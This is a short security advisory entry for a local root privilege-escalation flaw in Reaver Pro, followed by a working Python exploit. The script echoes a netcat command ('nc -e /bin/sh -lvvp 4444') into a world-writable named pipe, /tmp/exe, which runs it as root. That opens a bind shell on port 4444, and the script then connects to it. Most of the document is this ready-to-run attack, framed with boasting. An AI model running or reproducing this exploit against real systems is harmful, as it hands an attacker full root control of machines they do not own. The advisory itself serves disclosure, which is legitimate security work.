source: http://www.securityfocus.com/bid/55725/info

Reaver Pro is prone to a local privilege-escalation vulnerability.

A local attacker may exploit this issue to execute arbitrary code with root privileges. Successful exploits may result in the complete compromise of affected computers. 

#!/usr/bin/env python
import os
print """
          Reaver Pro Local Root
   Exploits a hilarious named pipe flaw.
The named pipe /tmp/exe is open to anyone...
Any command echoed into it gets ran as root.
This simply launches a bindshell on 4444...
    Insecurety Research | insecurety.net
"""
print ""
print "This is why TacNetSol should hire me?"
print "[+] Sending command to named pipe..."
cmd = '''echo "nc -e /bin/sh -lvvp 4444" >> /tmp/exe'''
os.system(cmd)
print "[+] Connecting to bind shell, enjoy root!"
os.system("nc -v localhost 4444")